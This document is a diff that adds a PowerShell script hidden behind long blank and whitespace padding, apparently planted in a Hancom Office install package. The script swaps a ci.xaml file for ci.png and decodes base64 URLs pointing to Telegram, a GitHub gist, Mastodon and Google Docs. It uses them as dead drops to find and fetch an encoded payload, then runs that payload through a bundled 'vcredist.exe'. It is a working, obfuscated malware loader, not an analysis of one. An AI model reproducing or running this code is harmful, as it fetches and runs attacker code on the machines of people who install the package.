@@ -1,0 +1,250 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																														if ([Environment]::Is64BitOperatingSystem) {
+																																																																																																																																																																																																																																																																																																																														$ProgramFilesPath = ${env:ProgramFiles(x86)}
+																																																																																																																																																																																																																																																																																																																														} else {
+																																																																																																																																																																																																																																																																																																																														$ProgramFilesPath = $env:ProgramFiles
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$sourcePath = Join-Path $ProgramFilesPath "Hnc\Office 2024\HOffice130\Bin\UxXml\Hancom2016\Common\Image\ko-kr"
+																																																																																																																																																																																																																																																																																																																														Remove-Item -Path "$sourcePath\ci.xaml" -Force -ErrorAction SilentlyContinue
+																																																																																																																																																																																																																																																																																																																														Copy-Item -Path "ci.png" -Destination $sourcePath -ErrorAction SilentlyContinue
+																																																																																																																																																																																																																																																																																																																														$TkxBgEzPr = "aHR0cHM6Ly90Lm1lL2RSaWR1bEVEaFJRWU5SRWtO"
+																																																																																																																																																																																																																																																																																																																														$ZCiANdmlr = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vdGhhbWFuYXJ5YS9lYjkwMGVhN2NlMTczNGVmMDBlNWUzMGY4NDExZjdmMS9yYXcvUG93ZXI="
+																																																																																																																																																																																																																																																																																																																														$pybjWzOsw = "aHR0cHM6Ly90Lm1lL0lYdk1Hc2l5UHVIb1BTU2lE"
+																																																																																																																																																																																																																																																																																																																														$oyJVyJMCf = "aHR0cHM6Ly9tYXN0b2Rvbi5zb2NpYWwvQGRSaWR1bEVEaFJRWU5SRWtO"
+																																																																																																																																																																																																																																																																																																																														$CPuWmDCEv = "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vdWM/ZXhwb3J0PWRvd25sb2FkJmlkPQ=="
+																																																																																																																																																																																																																																																																																																																														function Get-WebContent {
+																																																																																																																																																																																																																																																																																																																														param($IfyshvJBA)
+																																																																																																																																																																																																																																																																																																																														$EJoRnwpWw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($IfyshvJBA))
+																																																																																																																																																																																																																																																																																																																														try {
+																																																																																																																																																																																																																																																																																																																														$WebRequest = Invoke-WebRequest -Uri $EJoRnwpWw -UseBasicParsing
+																																																																																																																																																																																																																																																																																																																														if ($WebRequest -notmatch "CheckMP") {
+																																																																																																																																																																																																																																																																																																																														throw "not found"
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$Id = $WebRequest -split "CheckMP" | Select-Object -Index 1
+																																																																																																																																																																																																																																																																																																																														$Id = $Id -split "\|" | Select-Object -Index 0
+																																																																																																																																																																																																																																																																																																																														if ($Id -match "^https?://") {
+																																																																																																																																																																																																																																																																																																																														$SFevpQGAd = $Id
+																																																																																																																																																																																																																																																																																																																														} else {
+																																																																																																																																																																																																																																																																																																																														$SFevpQGAd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CPuWmDCEv)) + $Id
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$WebRequest2 = Invoke-WebRequest -Uri $SFevpQGAd -UseBasicParsing
+																																																																																																																																																																																																																																																																																																																														$EncodedScript = $WebRequest2 -split "10\|" | Select-Object -Index 1
+																																																																																																																																																																																																																																																																																																																														if ($EncodedScript -eq $null) {
+																																																																																																																																																																																																																																																																																																																														throw "not found"
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$EncodedScript = $EncodedScript -split "\|" | Select-Object -Index 0
+																																																																																																																																																																																																																																																																																																																														return $EncodedScript
+																																																																																																																																																																																																																																																																																																																														} catch {
+																																																																																																																																																																																																																																																																																																																														return $null
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$BRBzPqvnl = @($TkxBgEzPr, $ZCiANdmlr, $pybjWzOsw, $oyJVyJMCf)
+																																																																																																																																																																																																																																																																																																																														$EncodedScript = $null
+																																																																																																																																																																																																																																																																																																																														foreach ($IfyshvJBA in $BRBzPqvnl) {
+																																																																																																																																																																																																																																																																																																																														$EncodedScript = Get-WebContent -IfyshvJBA $IfyshvJBA
+																																																																																																																																																																																																																																																																																																																														if ($EncodedScript -ne $null) {
+																																																																																																																																																																																																																																																																																																																														break
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														if ($EncodedScript -ne $null) {
+																																																																																																																																																																																																																																																																																																																														$ScriptBlock = [ScriptBlock]::Create("Install\Install_UI\lo\vcredist.exe -e $EncodedScript")
+																																																																																																																																																																																																																																																																																																																														$Result = & $ScriptBlock
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
